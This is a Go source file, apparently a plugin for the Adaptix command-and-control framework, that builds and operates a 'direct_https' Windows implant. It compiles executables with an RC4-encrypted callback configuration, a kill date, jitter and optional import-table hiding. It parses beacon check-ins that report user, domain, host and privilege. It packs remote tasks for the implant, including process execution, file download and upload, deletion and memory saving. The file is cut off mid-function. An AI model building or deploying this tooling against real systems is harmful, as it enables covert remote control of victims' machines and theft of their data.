// 文件作用：direct_https agent 的服务端插件入口：负责注册插件、生成 payload、创建 agent、打包任务、解析 agent 回包。
package main

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2"
)

type Teamserver interface {
	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentTerminate(agentId string, terminateTaskId string) error

	TsAgentBuildExecute(builderId string, workingDir string, program string, args ...string) error
	TsAgentBuildLog(builderId string, status int, message string) error

	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
	TsTaskUpdate(agentId string, data adaptix.TaskData)

	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int64) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error

	TsClientGuiFilesStatus(taskData adaptix.TaskData)
	TsClientGuiFilesWindows(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataWin)

	TsConvertCpToUTF8(input string, codePage int) string
	TsConvertUTF8toCp(input string, codePage int) string
	TsWin32Error(errorCode uint) string
}

type PluginAgent struct{}

type ExtenderAgent struct{}

var (
	Ts             Teamserver
	ModuleDir      string
	AgentWatermark string
)

const (
	// directHTTPSBeatV2Magic marks the self-authored learning-agent heartbeat
	// dialect. The first 8 bytes are still consumed by the HTTP listener wrapper;
	// this magic is the first field inside the extender-visible beat body.
	directHTTPSBeatV2Magic  uint = 0x44484232 // "DHB2"
	directHTTPSBeatV2Schema uint = 1

	// Schema 2 keeps the same DHB2 magic but appends a capability mask after
	// schema, so the server can negotiate packet envelopes per live agent.
	directHTTPSBeatV2CapsSchema     uint = 2
	directHTTPSBeatV3SectionSchema  uint = 3
	selfC2BeatV4Schema              uint = 4
	selfC2BeatV4Magic               uint = 0x4c504834 // "LPH4"
	selfC2BeatV5Schema              uint = 5
	selfC2BeatV5Magic               uint = 0x4c504835 // "LPH5"
	directHTTPSCapTaskEnvelopeV2    uint = 1 << 0
	directHTTPSCapResultEnvelopeV2  uint = 1 << 1
	directHTTPSCapSectionEnvelopeV3 uint = 1 << 2
	selfC2CapNativeFrameV4          uint = 1 << 3

	// The outer frame flags field can switch the envelope body from a raw
	// compatibility record stream to a self-authored section/TLV layout.
	directHTTPSEnvelopeFlagSectioned uint32 = 1 << 0
	directHTTPSSectionMeta           uint32 = 1
	directHTTPSSectionLegacyRecords  uint32 = 2

	// Schema4 uses a native task-record section on the wire instead of sending
	// the old command-record stream as a blob. The Windows side maps these
	// action ids back into its already-tested handler table at runtime.
	selfC2SectionTaskRecordV4        uint32 = 0x1010
	selfC2SectionResultStreamV4      uint32 = 0x2020 // accepted for schema4 payloads generated before 2026-07-10
	selfC2SectionResultBundleV4      uint32 = 0x2021
	selfC2TaskRecordV4Schema         uint32 = 1
	selfC2ResultStreamV4Schema       uint32 = 1
	selfC2ResultBundleV4Schema       uint32 = 1
	selfC2ResultCodecCompatBody      uint32 = 1
	selfC2ResultCodecNativeFields    uint32 = 2
	selfC2NativeResultRecordV4Schema uint32 = 1
	selfC2NativeResultFieldText      uint32 = 1
	selfC2NativeResultFieldPath      uint32 = 2

	selfC2ActionHello      uint32 = 0x0101
	selfC2ActionRunProcess uint32 = 0x0102
	selfC2ActionPwd        uint32 = 0x0201
	selfC2ActionCd         uint32 = 0x0202
	selfC2ActionLs         uint32 = 0x0203
	selfC2ActionCat        uint32 = 0x0204
	selfC2ActionMkdir      uint32 = 0x0205
	selfC2ActionRm         uint32 = 0x0206
	selfC2ActionCopy       uint32 = 0x0207
	selfC2ActionMove       uint32 = 0x0208
	selfC2ActionDisks      uint32 = 0x0209
	selfC2ActionDownload   uint32 = 0x0301
	selfC2ActionUpload     uint32 = 0x0302
	selfC2ActionSaveMemory uint32 = 0x0303

	// LPT4/LPR4 are the neutral self-authored task/result frame magics used by
	// schema4 agents. DHT2/DHR2 remain accepted only for transitional agents.
	selfC2TaskFrameV4Magic    string = "LPT4"
	selfC2ResultFrameV4Magic  uint   = 0x4c505234 // "LPR4"
	directHTTPSTaskV2Magic    string = "DHT2"
	directHTTPSTaskV2Schema   uint32 = 1
	directHTTPSResultV2Magic  uint   = 0x44485232 // "DHR2"
	directHTTPSResultV2Schema uint   = 1
)

type directHTTPSAgentCapabilities struct {
	BeatSchema   uint `json:"beat_schema"`
	Capabilities uint `json:"capabilities"`
}

func packDirectHTTPSCapabilities(beatSchema uint, capabilities uint) []byte {
	data, err := json.Marshal(directHTTPSAgentCapabilities{
		BeatSchema:   beatSchema,
		Capabilities: capabilities,
	})
	if err != nil {
		return nil
	}
	return data
}

func parseDirectHTTPSCapabilities(agentData adaptix.AgentData) (directHTTPSAgentCapabilities, bool) {
	var caps directHTTPSAgentCapabilities
	if len(agentData.CustomData) == 0 {
		return caps, false
	}
	if err := json.Unmarshal(agentData.CustomData, &caps); err != nil {
		return caps, false
	}
	return caps, true
}

func directHTTPSAgentSupportsPacketEnvelopeV2(agentData adaptix.AgentData) bool {
	caps, ok := parseDirectHTTPSCapabilities(agentData)
	if !ok {
		return false
	}
	want := directHTTPSCapTaskEnvelopeV2 | directHTTPSCapResultEnvelopeV2
	return caps.BeatSchema >= directHTTPSBeatV2CapsSchema && (caps.Capabilities&want) == want
}

func directHTTPSAgentSupportsSectionEnvelopeV3(agentData adaptix.AgentData) bool {
	caps, ok := parseDirectHTTPSCapabilities(agentData)
	if !ok {
		return false
	}
	want := directHTTPSCapTaskEnvelopeV2 | directHTTPSCapResultEnvelopeV2 | directHTTPSCapSectionEnvelopeV3
	return caps.BeatSchema >= directHTTPSBeatV3SectionSchema && (caps.Capabilities&want) == want
}

func selfC2AgentSupportsNativeFrameV4(agentData adaptix.AgentData) bool {
	caps, ok := parseDirectHTTPSCapabilities(agentData)
	if !ok {
		return false
	}
	want := directHTTPSCapTaskEnvelopeV2 | directHTTPSCapResultEnvelopeV2 | directHTTPSCapSectionEnvelopeV3 | selfC2CapNativeFrameV4
	return caps.BeatSchema >= selfC2BeatV4Schema && (caps.Capabilities&want) == want
}

// InitPlugin 是 Adaptix 加载插件时最先调用的入口，用来保存 teamserver、模块目录和水印。
func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	Ts = ts.(Teamserver)
	return &PluginAgent{}
}

// GetExtender 返回真正负责生成 payload、打包任务、解析回包的 agent 扩展对象。
func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
	return &ExtenderAgent{}
}

// disabledTask 返回一个“已完成但什么也不做”的任务，用来占位禁用的 tunnel/terminal 功能。
func disabledTask() adaptix.TaskData {
	return adaptix.TaskData{Type: 0, Sync: true, Completed: true}
}

// disabledConnectTCP 明确禁用 TCP tunnel 连接，direct_https 当前不做隧道转发。
func disabledConnectTCP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	return disabledTask()
}

// disabledConnectUDP 明确禁用 UDP tunnel 连接。
func disabledConnectUDP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	return disabledTask()
}

// disabledWriteTCP 明确禁用向 TCP tunnel 写数据。
func disabledWriteTCP(channelId int, data []byte) adaptix.TaskData {
	return disabledTask()
}

// disabledWriteUDP 明确禁用向 UDP tunnel 写数据。
func disabledWriteUDP(channelId int, data []byte) adaptix.TaskData {
	return disabledTask()
}

// disabledPause 明确禁用暂停 tunnel 的能力。
func disabledPause(channelId int) adaptix.TaskData {
	return disabledTask()
}

// disabledResume 明确禁用恢复 tunnel 的能力。
func disabledResume(channelId int) adaptix.TaskData {
	return disabledTask()
}

// disabledClose 明确禁用关闭 tunnel 的能力。
func disabledClose(channelId int) adaptix.TaskData {
	return disabledTask()
}

// disabledReverse 明确禁用反向监听/反向隧道能力。
func disabledReverse(tunnelId int, port int) adaptix.TaskData {
	return disabledTask()
}

// TunnelCallbacks 把所有 tunnel 回调都绑定到禁用函数，告诉框架本 agent 不支持 tunnel。
func (ext *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{
		ConnectTCP: disabledConnectTCP,
		ConnectUDP: disabledConnectUDP,
		WriteTCP:   disabledWriteTCP,
		WriteUDP:   disabledWriteUDP,
		Pause:      disabledPause,
		Resume:     disabledResume,
		Close:      disabledClose,
		Reverse:    disabledReverse,
	}
}

// disabledTerminalStart 明确禁用交互式终端启动。
func disabledTerminalStart(terminalId int, program string, sizeH int, sizeW int, oemCP int) adaptix.TaskData {
	return disabledTask()
}

// disabledTerminalWrite 明确禁用向交互式终端写数据。
func disabledTerminalWrite(terminalId int, oemCP int, data []byte) adaptix.TaskData {
	return disabledTask()
}

// disabledTerminalClose 明确禁用关闭交互式终端。
func disabledTerminalClose(terminalId int) adaptix.TaskData {
	return disabledTask()
}

// TerminalCallbacks 把 terminal 回调都绑定到禁用函数，告诉框架本 agent 不支持交互终端。
func (ext *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{
		Start: disabledTerminalStart,
		Write: disabledTerminalWrite,
		Close: disabledTerminalClose,
	}
}

// getStringArg 从 UI 参数 map 里取字符串；缺参数或类型不对就返回错误。
func getStringArg(args map[string]any, key string) (string, error) {
	v, ok := args[key].(string)
	if !ok {
		return "", fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

////// PLUGIN AGENT

type GenerateConfig struct {
	Os            string `json:"os"`
	Arch          string `json:"arch"`
	Format        string `json:"format"`
	Sleep         string `json:"sleep"`
	Jitter        int    `json:"jitter"`
	IsKillDate    bool   `json:"is_killdate"`
	Killdate      string `json:"kill_date"`
	Killtime      string `json:"kill_time"`
	IsWorkingTime bool   `json:"is_workingtime"`
	StartTime     string `json:"start_time"`
	EndTime       string `json:"end_time"`
	IatHiding     bool   `json:"iat_hiding"`
	UseProxy      bool   `json:"use_proxy"`
	ProxyType     string `json:"proxy_type"`
	ProxyHost     string `json:"proxy_host"`
	ProxyPort     int    `json:"proxy_port"`
	ProxyUsername string `json:"proxy_username"`
	ProxyPassword string `json:"proxy_password"`
	RotationMode  string `json:"rotation_mode"`
}

var (
	ObjectDirHTTP = "objects_http"
	ObjectFiles   = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "Commander", "crt", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "ProcLoader", "std", "utils", "WaitMask"}
	CFlags        = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
	LFlags        = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
)

// GenerateProfiles 把 UI/listener 配置整理、加密并打包成会被写入 payload 的 profile。
func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	var agentProfiles [][]byte

	for _, transportProfile := range profile.ListenerProfiles {
		var listenerMap map[string]any
		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
			return nil, err
		}

		var (
			generateConfig GenerateConfig
			params         []interface{}
		)

		if err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig); err != nil {
			return nil, err
		}

		agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
		if err != nil {
			return nil, err
		}

		killDate := 0
		if generateConfig.IsKillDate {
			dt := generateConfig.Killdate + " " + generateConfig.Killtime
			t, err := time.Parse("02.01.2006 15:04:05", dt)
			if err != nil {
				return nil, errors.New("Invalid date format, use: 'DD.MM.YYYY hh:mm:ss'")
			}
			killDate = int(t.Unix())
		}

		workingTime := 0
		if generateConfig.IsWorkingTime {
			workingTime, err = parseStringToWorkingTime(generateConfig.StartTime + "-" + generateConfig.EndTime)
			if err != nil {
				return nil, err
			}
		}

		sleepSeconds, err := parseDurationToSeconds(generateConfig.Sleep)
		if err != nil {
			return nil, err
		}

		listenerWatermark, _ := strconv.ParseInt(transportProfile.Watermark, 16, 64)

		encryptKeyHex, _ := listenerMap["encrypt_key"].(string)
		encryptKey, err := hex.DecodeString(encryptKeyHex)
		if err != nil {
			return nil, err
		}

		protocol, _ := listenerMap["protocol"].(string)
		if protocol != "http" {
			return nil, errors.New("direct_https only supports BeaconHTTP listener profiles")
		}

		sslEnabled, _ := listenerMap["ssl"].(bool)
		if !sslEnabled {
			return nil, errors.New("direct_https requires BeaconHTTP listener profiles with ssl=true")
		}

		params = append(params, int(agentWatermark))
		params = append(params, killDate)
		params = append(params, workingTime)
		params = append(params, sleepSeconds)
		params = append(params, generateConfig.Jitter)
		params = append(params, int(listenerWatermark))

		callbackRaw, _ := listenerMap["callback_addresses"].([]interface{})
		uriRaw, _ := listenerMap["uri"].([]interface{})
		userAgentRaw, _ := listenerMap["user_agent"].([]interface{})
		hostHeaderRaw, _ := listenerMap["host_header"].([]interface{})

		httpMethod, _ := listenerMap["http_method"].(string)
		parameterName, _ := listenerMap["hb_header"].(string)
		requestHeaders, _ := listenerMap["request_headers"].(string)

		var hosts []string
		var ports []int
		for _, item := range callbackRaw {
			line, ok := item.(string)
			if !ok {
				continue
			}
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			host, portStr, err := net.SplitHostPort(line)
			if err != nil {
				return nil, fmt.Errorf("invalid callback address '%s': %w", line, err)
			}
			port, err := strconv.Atoi(portStr)
			if err != nil {
				return nil, fmt.Errorf("invalid callback port '%s': %w", portStr, err)
			}
			hosts = append(hosts, host)
			ports = append(ports, port)
		}
		if len(hosts) == 0 {
			return nil, errors.New("at least one callback address must be set")
		}

		var uris []string
		for _, item := range uriRaw {
			if v, ok := item.(string); ok && strings.TrimSpace(v) != "" {
				uris = append(uris, strings.TrimSpace(v))
			}
		}
		if len(uris) == 0 {
			return nil, errors.New("at least one HTTP URI must be set")
		}

		var userAgents []string
		for _, item := range userAgentRaw {
			if v, ok := item.(string); ok && strings.TrimSpace(v) != "" {
				userAgents = append(userAgents, strings.TrimSpace(v))
			}
		}
		if len(userAgents) == 0 {
			userAgents = append(userAgents, "Mozilla/5.0")
		}

		var hostHeaders []string
		for _, item := range hostHeaderRaw {
			if v, ok := item.(string); ok && strings.TrimSpace(v) != "" {
				hostHeaders = append(hostHeaders, strings.TrimSpace(v))
			}
		}

		webPageOutput, _ := listenerMap["page-payload"].(string)
		ansOffset1 := strings.Index(webPageOutput, "<<<PAYLOAD_DATA>>>")
		if ansOffset1 < 0 {
			return nil, errors.New("listener page-payload must contain <<<PAYLOAD_DATA>>>")
		}
		ansOffset2 := len(webPageOutput[ansOffset1+len("<<<PAYLOAD_DATA>>>"):])

		rotationMode := 0
		if generateConfig.RotationMode == "random" {
			rotationMode = 1
		}

		proxyType := 0
		if generateConfig.UseProxy {
			if generateConfig.ProxyType == "https" {
				proxyType = 2
			} else {
				proxyType = 1
			}
		}

		params = append(params, sslEnabled)
		params = append(params, len(hosts))
		for i := 0; i < len(hosts); i++ {
			params = append(params, hosts[i])
			params = append(params, ports[i])
		}
		params = append(params, httpMethod)
		params = append(params, len(uris))
		for _, uri := range uris {
			params = append(params, uri)
		}
		params = append(params, parameterName)
		params = append(params, len(userAgents))
		for _, ua := range userAgents {
			params = append(params, ua)
		}
		params = append(params, requestHeaders)
		params = append(params, ansOffset1)
		params = append(params, ansOffset2)
		params = append(params, len(hostHeaders))
		for _, header := range hostHeaders {
			params = append(params, header)
		}
		params = append(params, rotationMode)
		params = append(params, proxyType)
		params = append(params, generateConfig.ProxyHost)
		params = append(params, generateConfig.ProxyPort)
		params = append(params, generateConfig.ProxyUsername)
		params = append(params, generateConfig.ProxyPassword)

		packedParams, err := PackArray(params)
		if err != nil {
			return nil, err
		}

		cryptParams, err := RC4Crypt(packedParams, encryptKey)
		if err != nil {
			return nil, err
		}

		profileArray := []interface{}{len(cryptParams), cryptParams, encryptKey}
		packedProfile, err := PackArray(profileArray)
		if err != nil {
			return nil, err
		}

		profileString := ""
		for _, b := range packedProfile {
			profileString += fmt.Sprintf("\\x%02x", b)
		}
		agentProfiles = append(agentProfiles, []byte(profileString))
	}
	return agentProfiles, nil
}

// BuildPayload 用 mingw 把配置对象和预编译对象链接成最终 Windows exe。
func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	var (
		filename string
		payload  []byte
	)

	if len(profile.ListenerProfiles) != 1 || len(agentProfiles) != 1 {
		return nil, "", errors.New("only one listener profile is supported")
	}

	var listenerMap map[string]any
	if err := json.Unmarshal(profile.ListenerProfiles[0].Profile, &listenerMap); err != nil {
		return nil, "", err
	}

	var generateConfig GenerateConfig
	if err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig); err != nil {
		return nil, "", err
	}
	if generateConfig.Format != "Exe" {
		return nil, "", errors.New("direct_https only builds Exe payloads")
	}

	protocol, _ := listenerMap["protocol"].(string)
	if protocol != "http" {
		return nil, "", errors.New("direct_https only supports BeaconHTTP listener profiles")
	}
	sslEnabled, _ := listenerMap["ssl"].(bool)
	if !sslEnabled {
		return nil, "", errors.New("direct_https requires BeaconHTTP listener profiles with ssl=true")
	}

	cFlags := CFlags
	lFlags := LFlags
	if generateConfig.IatHiding {
		cFlags += " -DIAT_HIDING"
		lFlags += " -nostdlib -nostartfiles -nodefaultlibs"
	}

	currentDir := ModuleDir
	tempDir, err := os.MkdirTemp("", "ax-*")
	if err != nil {
		return nil, "", err
	}
	defer os.RemoveAll(tempDir)

	compiler := "x86_64-w64-mingw32-g++"
	ext := ".x64.o"
	filename = "direct_https.x64.exe"
	if generateConfig.Arch == "x86" {
		compiler = "i686-w64-mingw32-g++"
		ext = ".x86.o"
		filename = "direct_https.x86.exe"
	}

	agentProfile := agentProfiles[0]
	agentProfileSize := len(agentProfile) / 4
	cmdConfig := fmt.Sprintf("%s %s %s/config.cpp -DPROFILE='\"%s\"' -DPROFILE_SIZE=%d -o %s/config.o", compiler, cFlags, ObjectDirHTTP, string(agentProfile), agentProfileSize, tempDir)
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling configuration...")
	if err := Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", cmdConfig); err != nil {
		return nil, "", err
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "Configuration compiled successfully")

	files := tempDir + "/config.o "
	files += ObjectDirHTTP + "/ConnectorHTTP" + ext + " "
	for _, ofile := range ObjectFiles {
		files += ObjectDirHTTP + "/" + ofile + ext + " "
	}
	files += ObjectDirHTTP + "/main" + ext

	if generateConfig.IatHiding {
		if generateConfig.Arch == "x86" {
			lFlags += " -Wl,-e,_WinMain@16"
		} else {
			lFlags += " -Wl,-e,WinMain"
		}
	}

	buildPath := tempDir + "/file.exe"
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Protocol: %s, Connector: ConnectorHTTP", protocol))
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Output format: Exe, Filename: %s", filename))
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Linking payload...")

	var buildArgs []string
	buildArgs = append(buildArgs, strings.Fields(lFlags)...)
	buildArgs = append(buildArgs, strings.Fields(files)...)
	buildArgs = append(buildArgs, "-o", buildPath)
	if err := Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, compiler, buildArgs...); err != nil {
		return nil, "", err
	}

	payload, err = os.ReadFile(buildPath)
	if err != nil {
		return nil, "", err
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes", len(payload)))
	return payload, filename, nil
}

func parseBeatCore(packer *Packer, agentData *adaptix.AgentData, sleep uint) (uint, uint8, uint8, uint, uint8) {
	agentData.Sleep = sleep
	agentData.Jitter = packer.ParseInt32()
	agentData.KillDate = int(packer.ParseInt32())
	agentData.WorkingTime = int(packer.ParseInt32())
	agentData.ACP = int(packer.ParseInt16())
	agentData.OemCP = int(packer.ParseInt16())
	agentData.GmtOffset = int(packer.ParseInt8())
	agentData.Pid = fmt.Sprintf("%v", packer.ParseInt16())
	agentData.Tid = fmt.Sprintf("%v", packer.ParseInt16())

	buildNumber := packer.ParseInt32()
	majorVersion := packer.ParseInt8()
	minorVersion := packer.ParseInt8()
	internalIp := packer.ParseInt32()
	flag := packer.ParseInt8()
	return buildNumber, majorVersion, minorVersion, internalIp, flag
}

func finalizeBeatHostFields(agentData *adaptix.AgentData, buildNumber uint, majorVersion uint8, minorVersion uint8, internalIp uint, flag uint8) {
	agentData.Arch = "x32"
	if (flag & 0b00000001) > 0 {
		agentData.Arch = "x64"
	}

	systemArch := "x32"
	if (flag & 0b00000010) > 0 {
		systemArch = "x64"
	}

	agentData.Elevated = false
	if (flag & 0b00000100) > 0 {
		agentData.Elevated = true
	}

	isServer := false
	if (flag & 0b00001000) > 0 {
		isServer = true
	}

	agentData.InternalIP = int32ToIPv4(internalIp)
	agentData.Os, agentData.OsDesc = GetOsVersion(majorVersion, minorVersion, buildNumber, isServer, systemArch)
}

func parseLegacyBeat(packer *Packer, firstSleep uint) (adaptix.AgentData, error) {
	var agentData adaptix.AgentData

	if false == packer.CheckPacker([]string{"int", "int", "int", "word", "word", "byte", "word", "word", "int", "byte", "byte", "int", "byte", "array", "array", "array", "array", "array"}) {
		return agentData, errors.New("error agentData legacy data")
	}

	buildNumber, majorVersion, minorVersion, internalIp, flag := parseBeatCore(packer, &agentData, firstSleep)
	finalizeBeatHostFields(&agentData, buildNumber, majorVersion, minorVersion, internalIp, flag)
	agentData.SessionKey = packer.ParseBytes()

	agentData.Domain = string(packer.ParseBytes())
	agentData.Computer = string(packer.ParseBytes())
	agentData.Username = Ts.TsConvertCpToUTF8(string(packer.ParseBytes()), agentData.ACP)
	agentData.Process = Ts.TsConvertCpToUTF8(string(packer.ParseBytes()), agentData.ACP)

	return agentData, nil
}

func parseBeatV2(packer *Packer) (adaptix.AgentData, error) {
	var agentData adaptix.AgentData

	if false == packer.CheckPacker([]string{"int"}) {
		return agentData, errors.New("error agentData v2 schema")
	}

	schema := packer.ParseInt32()
	capabilities := uint(0)
	if schema == directHTTPSBeatV2CapsSchema || schema == directHTTPSBeatV3SectionSchema || schema == selfC2BeatV4Schema || schema == selfC2BeatV5Schema {
		if false == packer.CheckPacker([]string{"int"}) {
			return agentData, errors.New("error agentData v2 capabilities")
		}
		capabilities = packer.ParseInt32()
	} else if schema != directHTTPSBeatV2Schema {
		return agentData, fmt.Errorf("unsupported agentData beat schema %d", schema)
	}

	beatCoreTypes := []string{"int", "int", "int", "int", "word", "word", "byte", "word", "word", "int", "byte", "byte", "int", "byte", "array", "array", "array", "array", "array"}
	if schema == selfC2BeatV5Schema {
		// schema5 carries session key + process only; the remaining host identity
		// arrays are deliberately absent from the wire format.
		beatCoreTypes = []string{"int", "int", "int", "int", "word", "word", "byte", "word", "word", "int", "byte", "byte", "int", "byte", "array", "array"}
	}
	if false == packer.CheckPacker(beatCoreTypes) {
		return agentData, errors.New("error agentData v2 data")
	}

	sleep := packer.ParseInt32()
	buildNumber, majorVersion, minorVersion, internalIp, flag := parseBeatCore(packer, &agentData, sleep)
	finalizeBeatHostFields(&agentData, buildNumber, majorVersion, minorVersion, internalIp, flag)
	agentData.SessionKey = packer.ParseBytes()

	// schema5 only keeps the process string.  schema4 retains the original
	// process -> username -> computer -> domain order for functional profiles.
	agentData.Process = Ts.TsConvertCpToUTF8(string(packer.ParseBytes()), agentData.ACP)
	if schema == selfC2BeatV5Schema {
		agentData.CustomData = packDirectHTTPSCapabilities(schema, capabilities)
		return agentData, nil
	}
	agentData.Username = Ts.TsConvertCpToUTF8(string(packer.ParseBytes()), agentData.ACP)
	agentData.Computer = string(packer.ParseBytes())
	agentData.Domain = string(packer.ParseBytes())
	agentData.CustomData = packDirectHTTPSCapabilities(schema, capabilities)

	return agentData, nil
}

// CreateAgent 解析 agent 第一次 check-in 的心跳包，并生成 Adaptix 里显示的 agent 信息。
func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	var agentData adaptix.AgentData
	packer := CreatePacker(beat)

	if false == packer.CheckPacker([]string{"int"}) {
		return agentData, nil, errors.New("error agentData data")
	}

	first := packer.ParseInt32()
	var err error
	if first == directHTTPSBeatV2Magic || first == selfC2BeatV4Magic || first == selfC2BeatV5Magic {
		agentData, err = parseBeatV2(packer)
	} else {
		agentData, err = parseLegacyBeat(packer, first)
	}
	if err != nil {
		return agentData, nil, err
	}

	return agentData, &ExtenderAgent{}, nil
}

// Encrypt 用 RC4 加密服务端准备发给 agent 的数据。
func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
	return RC4Crypt(data, key)
}

// Decrypt 用 RC4 解密 agent 回传给服务端的数据；RC4 对称，所以和 Encrypt 调同一个函数。
func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
	return RC4Crypt(data, key)
}

// PackTasks 把多个 Adaptix 任务打成 agent 能识别的一段二进制任务包。
func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
	var (
		array       []interface{}
		nativeTasks []selfC2NativeTaskRecord
		err         error
	)

	for _, taskData := range tasks {
		taskId, err := strconv.ParseInt(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}
		array = append(array, taskData.Data)
		array = append(array, int(taskId))

		if selfC2AgentSupportsNativeFrameV4(agentData) {
			nativeTask, err := buildSelfC2NativeTaskRecord(taskData.Data, uint32(taskId))
			if err != nil {
				return nil, err
			}
			nativeTasks = append(nativeTasks, nativeTask)
		}
	}

	packData, err := PackArray(array)
	if err != nil {
		return nil, err
	}

	if selfC2AgentSupportsNativeFrameV4(agentData) {
		return packSelfC2TaskFrameV4(nativeTasks), nil
	}
	if directHTTPSAgentSupportsSectionEnvelopeV3(agentData) {
		return packTaskSectionEnvelopeV3(packData, len(tasks)), nil
	}
	if directHTTPSAgentSupportsPacketEnvelopeV2(agentData) {
		return packTaskEnvelopeV2(packData, len(tasks)), nil
	}
	return packLegacyTaskBody(packData), nil
}

func packLegacyTaskBody(body []byte) []byte {
	packData := make([]byte, 4, 4+len(body))
	binary.LittleEndian.PutUint32(packData, uint32(len(body)))
	packData = append(packData, body...)
	return packData
}

func appendLE32(buf []byte, value uint32) []byte {
	field := make([]byte, 4)
	binary.LittleEndian.PutUint32(field, value)
	return append(buf, field...)
}

func appendBE32(buf []byte, value uint32) []byte {
	field := make([]byte, 4)
	binary.BigEndian.PutUint32(field, value)
	return append(buf, field...)
}

type selfC2NativeTaskRecord struct {
	TaskID        uint32
	ActionID      uint32
	ArgumentBytes []byte
}

func selfC2ActionFromCommand(commandID uint32) (uint32, bool) {
	switch commandID {
	case COMMAND_HELLO:
		return selfC2ActionHello, true
	case COMMAND_PS_RUN:
		return selfC2ActionRunProcess, true
	case COMMAND_PWD:
		return selfC2ActionPwd, true
	case COMMAND_CD:
		return selfC2ActionCd, true
	case COMMAND_LS:
		return selfC2ActionLs, true
	case COMMAND_CAT:
		return selfC2ActionCat, true
	case COMMAND_MKDIR:
		return selfC2ActionMkdir, true
	case COMMAND_RM:
		return selfC2ActionRm, true
	case COMMAND_COPY:
		return selfC2ActionCopy, true
	case COMMAND_MV:
		return selfC2ActionMove, true
	case COMMAND_DISKS:
		return selfC2ActionDisks, true
	case COMMAND_DOWNLOAD:
		return selfC2ActionDownload, true
	case COMMAND_UPLOAD:
		return selfC2ActionUpload, true
	case COMMAND_SAVEMEMORY:
		return selfC2ActionSaveMemory, true
	default:
		return 0, false
	}
}

func buildSelfC2NativeTaskRecord(taskData []byte, taskID uint32) (selfC2NativeTaskRecord, error) {
	if len(taskData) < 4 {
		return selfC2NativeTaskRecord{}, errors.New("native task data is too short")
	}
	commandID := binary.LittleEndian.Uint32(taskData[:4])
	actionID, ok := selfC2ActionFromCommand(commandID)
	if !ok {
		return selfC2NativeTaskRecord{}, fmt.Errorf("command %d does not have a schema4 native action id", commandID)
	}
	return selfC2NativeTaskRecord{
		TaskID:        taskID,
		ActionID:      actionID,
		ArgumentBytes: taskData[4:],
	}, nil
}

func packSelfC2NativeTaskRecordValue(task selfC2NativeTaskRecord) []byte {
	value := make([]byte, 0, 16+len(task.ArgumentBytes))
	value = appendLE32(value, selfC2TaskRecordV4Schema)
	value = appendLE32(value, task.TaskID)
	value = appendLE32(value, task.ActionID)
	value = appendLE32(value, uint32(len(task.ArgumentBytes)))
	value = append(value, task.ArgumentBytes...)
	return value
}

// packTaskSectionEnvelopeV3 把 DHT2 body 变成 section/TLV：
//
//	section_count/le32
//	section_type/le32 | section_len/le32 | section_value
//
// 当前只新增 meta section，真正的任务流仍放在 legacy-records section，
// 这样 command handler 不需要一次性迁移。
func buildTaskSectionBody(compatBody []byte, taskCount int, schema uint32, capabilities uint32) []byte {
	meta := make([]byte, 0, 16)
	for _, value := range []uint32{schema, capabilities, uint32(taskCount), uint32(len(compatBody))} {
		meta = appendLE32(meta, value)
	}

	sectioned := make([]byte, 0, 4+8+len(meta)+8+len(compatBody))
	sectioned = appendLE32(sectioned, 2)
	sectioned = appendLE32(sectioned, directHTTPSSectionMeta)
	sectioned = appendLE32(sectioned, uint32(len(meta)))
	sectioned = append(sectioned, meta...)
	sectioned = appendLE32(sectioned, directHTTPSSectionLegacyRecords)
	sectioned = appendLE32(sectioned, uint32(len(compatBody)))
